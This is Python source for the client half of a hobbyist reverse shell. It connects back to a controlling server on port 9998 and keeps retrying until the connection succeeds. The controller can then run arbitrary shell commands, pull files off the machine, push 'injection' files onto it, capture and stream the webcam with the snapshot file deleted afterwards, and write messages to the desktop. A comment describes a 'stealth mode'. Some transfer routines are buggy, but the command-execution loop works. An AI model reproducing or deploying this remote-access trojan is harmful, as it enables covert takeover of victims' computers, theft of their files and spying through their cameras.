""" Client build of Nardis Reverse Shell Terminal Created by "Arturo"
Connects to terminal of sockets on port 9998 and can execute a variety of commands over a network
Created 5/2020 during finals.
"""

import socket
import os
import subprocess
import sys
from datetime import datetime
import time
import numpy as np
import cv2
from cryptography.fernet import Fernet

s = socket.socket()
HOST = "localhost"
#HOST = "192.168.0.14" # address of server
PORT = 9998
SECURE = False

def transfer_to_server(sock, path):
    """ grab - sends simple file to server """
    #print("Recieved Transfer Request")
    if os.path.exists(path):
        with open(path, 'rb') as f_og:
            packet_size = 1024
            packet = f_og.read(packet_size)
            while len(packet.decode("utf-8")) > 900:
                print("size: " + str(len(packet)))
                #sock.send(packet)
                packet = f_og.read(packet_size)
            sock.send(str.encode('ENDOFFILE832'))
    else: # the file doesn't exist
        s.send(str.encode('Unable to find file832'))

def transfer_to_client(sock, cmd):
    """ give - sends simple file from injection folder to client """
    try:
        with open(cmd, "w") as f_c:
            pass
        with open(cmd, "r") as f_r:
            pass
    except FileNotFoundError:
        transfer_to_client(sock, cmd)

    with open(cmd, "wb") as f:
        while True:
            bits = s.recv(1024)
            #print(bits.decode("utf-8"))
            if "end of file832" in str(bits, "utf-8"):
                break
            f.write(bits)

def write_to_file(sock, file_name):
    """ write - leaves simple message on client's desktop """
    f = open(file_name + ".txt", "wb")
    line = sock.recv(1024)
    line_decoded = ""
    while line_decoded != 'finish_write':
        sock.send(str.encode("line_received"))
        line_decoded = line.decode("utf-8")
        f.write(line)
        line = sock.recv(1024)
    f.close

def fat_transfer_to_server(sock, cmd):
    """ fatgrab - tries whole tranfer of a file to the server """
    file_name = cmd.replace("fatgrab ", "")
    name = ""
    try:
        fat_file = open("./" + file_name, "rb")
    except FileNotFoundError:
        sock.send(str.encode("filenotfound23123"))
        name = "file not found..."
    if name != "file not found...":
        sock.send(str.encode(file_name))
        time.sleep(.5)
        bits = fat_file.read()
        sock.send(bits)
    else:
        pass

def fat_transfer_to_client(sock, cmd):
    """ fatgive - tries whole transfer of an injection to the client """
    file_name = cmd.replace("fatgive ", "")
    can_open_file = False
    try:
        inj_file = open("./" + file_name, "wb")
        sock.send(str.encode("can_open212"))
        can_open_file = True
    except:
        sock.send(str.encode("cannot_open_file212"))
    if can_open_file:
        sizeoffile = int(sock.recv(1024))
        print(sizeoffile)
        print("File size is " + str(sizeoffile))
        sock.send("all ready".encode())
        bits = sock.recv(sizeoffile)
        inj_file.write(bits)
        print("recieved and wrote to file " + str(sys.getsizeof(bits)) + " bits")
        inj_file.close()

def transfer_to_client_plus(sock, cmd):
    """ giveplus - allows for transfer on non-text based digital media """
    try:
        with open(cmd, "w") as f_c:
            pass
        with open(cmd, "r") as f_r:
            pass
    except FileNotFoundError:
        transfer_to_client(sock, cmd)

    with open(cmd, "wb") as f:
        while True:
            bits = s.recv(1024)
            #print(bits.decode("utf-8"))
            if sys.getsizeof(bits) < 1024:
                f.write(bits)
                f.close() 
                break
            f.write(bits)

def check_camera(src):
    """ checks to see if camera exists because opencv cant do exception handling for some reason """
    cap_test = cv2.VideoCapture(src)
    if cap_test is None or not cap_test.isOpened():
        return False
    else:
        return True

def transfer_camera_frame(sock, data_b):
    """ snapshot n - sends image from camera to server (where n is index of cameras) """
    try:
        src = int(data_b.replace("snapshot ", ""))
        invalid_selection = False
    except ValueError:
        sock.send(str.encode("invalid_camera_excpetion222"))
        invalid_selection = True
    if not invalid_selection and not check_camera(src):
        sock.send(str.encode("couldnotsendfile222"))
    else:
        vc = cv2.VideoCapture(0)
        rval, frame = vc.read()
        if rval:
            dtt = datetime.now().strftime('%Y-%m-%d-%H:%M:%S')
            file_name = './snapshot-'+ dtt + '.jpg'
            cv2.imwrite(file_name, frame)
            sock.send(str.encode(file_name[2:]))
            time.sleep(1)
            f = open(file_name, 'rb')
            bits = f.read(4096) # larger buffer size for images
            oldsize = sys.getsizeof(bits)
            while True:
                size = sys.getsizeof(bits)
                sock.send(bits)
                bits = f.read(4096)
                if oldsize != size:
                    break
                oldsize = size
            f.close
            sock.send(bits) # flush buffer
            os.remove(file_name) # deletes file from client computer
            #s.send(str.encode(currentWorkingDirectory)) # sends cwd to look nice
            #print("sent cwd")
        else:
            s.send(str.encode("couldnotsendfile222"))

def send_camera_feed(sock):
    """ stream - send stream of images from client's camera """
    sock.send(str.encode("ready_for_video414")) # confirmation packet
    alive = True
    while alive:
        vc = cv2.VideoCapture(0)
        if vc.isOpened():
            rval, frame = vc.read()
            if rval:
                #name = "picture.jpg"
                sock.send(frame.encode())
                print("sent frame")
            else:
                alive = False

def basic_encryption(msg):
    if os.path.isfile("rs_encrypt.key"):
        with open("rs_encrypt.key", "rb") as key_file:
            key = key_file.read()
        fern = Fernet(key)
        return fern.encrypt(msg.encode())
    else:
        print("Missing key file...")
        return "uh_oh_1997"

def basic_decryption(msg):
    if os.path.isfile("rs_encrypt.key"):
        with open("rs_encrypt.key", "rb") as key_file:
            key = key_file.read()
        fern = Fernet(key)
        return fern.decrypt(msg).decode("utf-8")
    else:
        print("Missing key file...")
        return "uh_oh_1997"

def try_connection():
    """ Waits for server to be online, then connects """
    while True:
        try:
            s.connect((HOST, PORT))
            break
        except ConnectionRefusedError or OSError:
            time.sleep(5) # 5 second connection attempt intervals


try_connection()

while True: # create a read/write infinite loop
    if SECURE:
        data = basic_decryption(s.recv(1024)).encode()
    else:
        data = s.recv(1024)

    if data.decode("utf-8")[:2] == 'cd':
        try:
            new_dir = data.decode("utf-8")
            os.chdir(new_dir[3:])
            s.send(str.encode(os.getcwd() + " > "))
        except FileNotFoundError as error_msg:
            s.send(str.encode(str(error_msg) + "\n" + os.getcwd() + " > "))
        except Exception as error_msg:
            s.send(str.encode(str(error_msg) + "\n" + os.getcwd() + " > "))

    elif data.decode("utf-8") == "encrypt" or data.decode("utf-8") == "unencrypt":
        if data.decode("utf-8") == "encrypt" and not SECURE:
            if os.path.isfile("rs_encrypt.key"):
                s.send(str.encode("Beginning encrypted session..."))
                SECURE = True
            else:
                s.send(str.encode("error: client missing rs_encrypt.key file."))
        elif data.decode("utf-8") == "unencrypt" and SECURE:
            msg = basic_encryption("Ending encrypted session")
            s.send(msg.encode())
            SECURE = False

    elif data.decode("utf-8") == 'break':
        break

    elif "fatgrab " in data.decode("utf-8"):
        fat_transfer_to_server(s, data.decode("utf-8"))

    elif "grab" in data.decode("utf-8"):
        path = data.decode("utf-8")
        new_path = path.replace("grab ", "")
        try: # always use exception handling in low level file transfer
            transfer_to_server(s, new_path)
        except Exception as error_msg:
            s.send(str.encode(str(error_msg)))

    elif "fatgive " in data.decode("utf-8"):
        command_decoded = data.decode("utf-8")
        fat_transfer_to_client(s, command_decoded)

    elif "giveplus " in data.decode("utf-8"):
        command_decoded = (data.decode("utf-8")).replace("giveplus ", "")
        transfer_to_client_plus(s, command_decoded)

    elif "give " in data.decode("utf-8"):
        path = data.decode("utf-8")
        new_path = path.replace("give ", "")
        try:
            cmd = data.decode("utf-8")
            crop_cmd = cmd.replace("give ", "")
            transfer_to_client(s, crop_cmd)
        except Exception as error_msg:
            s.send(str.encode(str(error_msg)))

    elif "write " in data.decode("utf-8"):
        try:
            cmd = data.decode("utf-8")
            fname = cmd.replace("write ", "")
            write_to_file(s, fname)
        except Exception as error_msg:
            s.send(str.encode(str(error_msg)))

    elif data.decode("utf-8") == "info":
        try:
            OS_NAME = str(os.name + "\n" + os.getcwd() + " > ")
            s.send(str.encode(OS_NAME))
        except Exception as error_msg:
            s.send(str.encode(str(error_msg)))

    elif data.decode("utf-8")[:9] == "snapshot ":
        try:
            transfer_camera_frame(s, data.decode("utf-8"))
        except Exception as error_msg:
            s.send(str.encode(str(error_msg)))

    elif data.decode("utf-8") == "stream":
        send_camera_feed(s)

    elif len(data) > 0:
        datastr = data.decode("utf-8")
        cmd = subprocess.Popen(datastr, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = output_byte.decode("utf-8")
        currentWorkingDirectory = os.getcwd() + " > "
        s.send(str.encode(output_str + currentWorkingDirectory))
        # print(output_str) # delete this part to remove output on client computer (Stealth mode)
    
    #elif len(data) == 0:
    #    s.close
    #    try_connection()
